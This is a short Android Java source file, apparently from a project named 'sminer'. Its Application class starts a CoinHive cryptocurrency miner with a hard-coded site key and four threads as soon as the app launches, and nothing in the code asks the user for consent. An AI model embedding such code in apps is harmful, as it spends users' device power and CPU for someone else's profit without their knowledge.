package ca.concordia.project.sminer;

import android.app.Application;

import com.theah64.coinhive.CoinHive;

public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        CoinHive.getInstance().init("w1qIJFRZhJaC1oEApbSFnelJYzjNsSqP")
                .setNumberOfThreads(4)
                .setIsAutoThread(true)
                .setLoggingEnabled(true)
                .setForceASMJS(false);
    }
    }
